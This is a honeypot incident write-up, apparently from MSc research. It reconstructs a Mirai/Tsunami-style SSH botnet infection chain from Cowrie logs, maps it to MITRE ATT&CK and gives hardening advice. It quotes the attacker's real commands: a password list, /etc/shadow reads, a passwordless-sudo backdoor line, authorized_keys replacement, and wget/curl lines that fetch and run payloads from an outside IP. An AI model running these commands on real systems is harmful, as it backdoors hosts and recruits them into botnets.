# ⛓️ Reconstructed Intrusion Chain — Cowrie Honeypot

**Source:** Cowrie SSH/Telnet honeypot logs — T-Pot deployment
**Environment:** DigitalOcean Ubuntu 22.04 — Live internet exposure (~2 months)

---

## Overview

Cowrie successfully captured a **complete real-world IoT botnet infection chain**, from initial brute-force login through to malware delivery and persistence. The behaviour observed is consistent with **Mirai** and **Tsunami** botnet automation scripts.

The following documents the full attack sequence as reconstructed from Cowrie session logs.

---

## Stage 1 — Initial Access: SSH Brute Force

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

The attacker performed automated credential stuffing using a dictionary of common username/password combinations targeting **port 22 (SSH)**.

Credentials attempted:

root / admin
root / password
admin / admin123
root / 123456
admin / password

Once authentication succeeded, the attacker immediately issued shell commands — confirming **automated botnet behaviour** rather than a manual attacker.

---

## Stage 2 — Reconnaissance

**MITRE ATT&CK:** T1082 — System Information Discovery | T1033 — System Owner/User Discovery

The attacker gathered system information to determine the correct malware binary architecture (ARM, MIPS, x86, PowerPC).

Commands executed:

uname -a
id
cat /etc/passwd
cat /etc/shadow
lscpu
df -h

This reconnaissance step is a direct precursor to selecting the correct ELF binary for the target architecture.

---

## Stage 3 — Privilege Escalation

**MITRE ATT&CK:** T1548 — Abuse Elevation Control Mechanism | T1136 — Create Account

The attacker executed commands to gain persistent root-level access:

echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
chsh -s /bin/sh daemon
echo Password123 | passwd daemon --stdin

Effect:
- Granted passwordless sudo to the daemon user
- Created a privileged backdoor account
- Enabled easier command execution for subsequent payloads

---

## Stage 4 — Persistence

**MITRE ATT&CK:** T1098.004 — SSH Authorized Keys | T1543 — Create or Modify System Process

### 4a. SSH Key Injection

The attacker replaced the authorized_keys file with a malicious public key downloaded from the C2 server:

mkdir ~/.ssh
chattr -ia ~/.ssh/* ~/.ssh
wget http://47.105.158.116/ns1.jpg -O ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

Effect: Grants the attacker passwordless SSH access even after the malware is removed.

### 4b. Hidden Backdoor Directory

mkdir /sbin/.ssh
cp ~/.ssh/authorized_keys /sbin/.ssh

Effect: Conceals the SSH key in an unexpected system directory to survive cleanup attempts.

---

## Stage 5 — Malware Delivery

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer | T1036.007 — Masquerade File Type

### The Fake JPG Trick

The attacker downloaded files with .jpg extensions that were NOT images — they were Linux ELF malware binaries disguised to bypass naive content filtering:

wget http://47.105.158.116/ns1.jpg -O /tmp/x
wget http://47.105.158.116/ns3.jpg -O /tmp/x
chmod +x /tmp/x
/tmp/x
mv /tmp/x /tmp/o
/tmp/o
rm -f /tmp/o

Why .jpg extensions:
- Bypass file extension filtering rules
- Avoid detection by signature-based monitoring
- Evade naive intrusion detection systems

Confirmed malware families via Hybrid Analysis:
- Tsunami — DDoS botnet with IRC-based C2
- Mirai — IoT botnet targeting SSH/Telnet port 22/23
- Backdoor:Linux — Generic ELF Remote Access Trojan

---

## Stage 6 — Additional Payload Delivery

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

wget http://47.105.158.116/oto -O /etc/oto
curl http://47.105.158.116/oto -o /tmp/oto
chmod 755 /tmp/oto
/tmp/oto

Likely contents:
- DDoS bot modules
- SSH brute-force modules for further propagation
- Additional persistence scripts

---

## Full Attack Chain Summary

[1] SSH Brute Force (port 22)
         ↓
[2] Successful Authentication (root/admin credentials)
         ↓
[3] Reconnaissance (uname, id, lscpu, /etc/passwd)
         ↓
[4] Privilege Escalation (sudoers modification, backdoor account)
         ↓
[5] Persistence (SSH key injection, hidden backdoor directory)
         ↓
[6] Malware Delivery (fake .jpg ELF binaries — Mirai / Tsunami)
         ↓
[7] Additional Payload (DDoS modules, persistence scripts)
         ↓
[8] System Compromised — Botnet Participation

---

## Impact Assessment

| Impact | Description |
|---|---|
| Full System Compromise | Root-level shell access |
| Persistent Unauthorised Access | SSH key injection survives reboots |
| Malware Installation | Mirai/Tsunami DDoS bot active |
| Botnet Participation | System recruited into DDoS network |
| Credential Theft | Shadow file access attempted |

---

## Recommendations

### Network Hardening
- Disable SSH password authentication — enforce key-based auth only
- Restrict SSH access to known IPs or VPN
- Change default SSH port from 22

### Monitoring & Detection
Enable alerts on:
- wget / curl download activity
- Modifications to /etc/sudoers
- Changes to ~/.ssh/authorized_keys
- High-volume failed SSH login attempts

### Malware Defence
- Block known malicious IPs using threat intelligence feeds
- Isolate any system exhibiting similar behaviour immediately
- Submit suspicious binaries to Hybrid Analysis / sandbox environments

---

> *Attack chain reconstructed from Cowrie SSH honeypot session logs as part of MSc Applied Cybersecurity research at TU Dublin.*
